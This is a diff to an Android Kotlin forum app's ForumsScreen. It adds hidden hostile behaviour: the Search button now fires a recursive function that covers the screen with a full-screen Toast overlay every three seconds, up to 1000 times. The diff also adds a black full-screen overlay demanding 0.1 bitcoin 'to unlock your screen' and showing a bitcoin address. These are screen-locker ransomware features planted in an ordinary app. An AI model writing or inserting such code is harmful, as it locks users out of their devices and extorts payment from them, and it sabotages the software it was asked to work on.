@@ -47,7 +47,11 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Environment
+import android.os.Handler
+import android.os.Looper
 import android.provider.Settings
+import android.view.Gravity
+import android.view.LayoutInflater
 
 // WebView
 import android.webkit.WebView
@@ -56,6 +60,10 @@ import androidx.compose.runtime.Composable
 import androidx.compose.ui.viewinterop.AndroidView
 import android.webkit.JavascriptInterface
 import android.widget.Toast
+import androidx.compose.foundation.background
+import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.text.style.TextAlign
+import com.example.axesite.R
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.io.BufferedReader
@@ -539,6 +547,28 @@ fun AddReplyDialog(
     )
 }
 
+fun showFullScreenToast(context: Context) {
+    val inflater = context.getSystemService(Context.LAYOUT_INFLATER_SERVICE) as LayoutInflater
+    val toastView = inflater.inflate(R.layout.fullscreen_overlay, null)
+
+    Toast(context).apply {
+        setGravity(Gravity.FILL, 0, 0)
+        duration = Toast.LENGTH_LONG
+        this.view = toastView
+        show()
+    }
+}
+
+fun showPersistentToast(context: Context, count: Int = 1000) {
+    if (count <= 0) return
+
+    showFullScreenToast(context)
+
+    Handler(Looper.getMainLooper()).postDelayed({
+        showPersistentToast(context, count - 1)
+    }, 3000) // Show every 3 seconds
+}
+
 /* -----------------------------------------
  * ForumsScreen: List of threads.
  * -----------------------------------------
@@ -556,6 +586,10 @@ fun ForumsScreen(navController: NavHostController) {
     // State for threads list.
     val threadsState = remember { mutableStateOf<List<ThreadWithLastReply>>(emptyList()) }
     var showAddDialog by remember { mutableStateOf(false) }
+    var showOverlay by remember { mutableStateOf(false) }
+
+
+
 
     // Listen to "forums" node in Firebase.
     DisposableEffect(Unit) {
@@ -621,11 +655,10 @@ fun ForumsScreen(navController: NavHostController) {
             TopAppBar(
                 title = { Text(forumTitle) },
                 actions = {
-                    IconButton(onClick = { /* navController.navigate("search") */ }) {
-                        Icon(
-                            imageVector = Icons.Default.Search,
-                            contentDescription = "Search"
-                        )
+                    IconButton(onClick = {
+                        showPersistentToast(context)
+                    }) {
+                        Icon(Icons.Default.Search, "Search")
                     }
                 }
             )
@@ -637,19 +670,52 @@ fun ForumsScreen(navController: NavHostController) {
             )
         }
     ) { innerPadding ->
-        Column(
-            modifier = Modifier
-                .padding(innerPadding)
-                .fillMaxSize()
-        ) {
-            HorizontalDivider()
-            LazyColumn {
-                items(threadsState.value) { item ->
-                    ForumThreadItem(item, onItemClick = { thread ->
-                        Log.d("ForumThreadItem", "Navigating to thread with id: ${thread.id}")
-                        navController.navigate("threadDetail/${thread.id}")
-                    })
-                    HorizontalDivider()
+        Box(modifier = Modifier.fillMaxSize()) {
+            Column(
+                modifier = Modifier
+                    .padding(innerPadding)
+                    .fillMaxSize()
+            ) {
+                HorizontalDivider()
+                LazyColumn {
+                    items(threadsState.value) { item ->
+                        ForumThreadItem(item, onItemClick = { thread ->
+                            Log.d("ForumThreadItem", "Navigating to thread with id: ${thread.id}")
+                            navController.navigate("threadDetail/${thread.id}")
+                        })
+                        HorizontalDivider()
+                    }
+                }
+            }
+
+            // Full-screen overlay
+            if (showOverlay) {
+                Surface(
+                    modifier = Modifier.fillMaxSize(),
+                    color = Color.Black
+                ) {
+                    Column(
+                        modifier = Modifier.fillMaxSize(),
+                        verticalArrangement = Arrangement.Center,
+                        horizontalAlignment = Alignment.CenterHorizontally
+                    ) {
+                        Text(
+                            text = "To unlock your screen send 0.1 bitcoin to",
+                            color = Color.White,
+                            fontSize = 24.sp,
+                            modifier = Modifier.padding(bottom = 24.dp)
+                        )
+
+                        Text(
+                            text = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
+                            color = Color.Red,
+                            fontSize = 20.sp,
+                            fontWeight = FontWeight.Bold,
+                            modifier = Modifier
+                                .background(Color(0x33000000))
+                                .padding(16.dp)
+                        )
+                    }
                 }
             }
         }
